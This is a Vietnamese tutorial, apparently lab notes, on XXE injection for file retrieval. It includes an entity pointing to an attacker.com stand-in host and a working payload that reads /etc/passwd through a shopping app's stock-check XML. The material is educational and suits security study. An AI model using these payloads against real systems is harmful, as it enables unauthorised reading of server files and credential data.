# Overview:

Khai thác XXE để lấy các tệp tin, trong đó một thực thể ngoại vi được định nghĩa chứa nội dung của một tệp tin, và được trả về trong phản hồi của ứng dụng.

Việc khai thác XXE để lấy các tệp tin là khi kẻ tấn công chèn một thực thể ngoại vi vào tài liệu XML, chứa nội dung của tệp tin. Khi ứng dụng xử lý XML, nội dung của thực thể ngoại vi này được trả về trong phản hồi của ứng dụng.

Ví dụ:

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://attacker.com/malicious-file">
]>
<data>&xxe;</data>
```

Trong ví dụ trên, kẻ tấn công chèn một thực thể ngoại vi `xxe` và truy cập tệp tin `malicious-file` từ xa thông qua URL `http://attacker.com/malicious-file`. Dữ liệu từ tệp tin này sẽ được đưa vào tài liệu XML và trả về trong phản hồi của ứng dụng.

Việc khai thác XXE để lấy các tệp tin có thể gây ra những vấn đề bảo mật nghiêm trọng, bao gồm tiết lộ thông tin nhạy cảm, tấn công từ chối dịch vụ (DoS) và thực hiện các cuộc tấn công từ xa.

# Example:

Để thực hiện một cuộc tấn công tiêm nạp XXE nhằm lấy một tệp tin tùy ý từ hệ thống tệp tin của máy chủ, bạn cần sửa đổi XML gửi đi theo hai cách sau:

1. Thêm (hoặc chỉnh sửa) một phần tử DOCTYPE mô tả một thực thể bên ngoài chứa đường dẫn đến tệp tin.
2. Chỉnh sửa một giá trị dữ liệu trong XML được trả về trong phản hồi của ứng dụng, để sử dụng thực thể bên ngoài đã được định nghĩa.

Ví dụ, giả sử một ứng dụng mua sắm kiểm tra mức hàng tồn kho của một sản phẩm bằng cách gửi XML sau đến máy chủ:
```xml
<product>
  <id>123</id>
</product>
```

Để thực hiện cuộc tấn công XXE, bạn cần sửa đổi XML để chèn một phần tử DOCTYPE và một thực thể bên ngoài. Ví dụ:

```xml
<!DOCTYPE product [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<product>
  <id>&xxe;</id>
</product>
```

Trong ví dụ này, chúng ta đã chèn một phần tử DOCTYPE với một thực thể bên ngoài có tên là `xxe` và giá trị là `file:///etc/passwd`. Khi ứng dụng xử lý XML này, nó sẽ đọc nội dung của tệp `/etc/passwd` và trả về trong phản hồi của ứng dụng.

Ta sẽ thực hành ở đây.

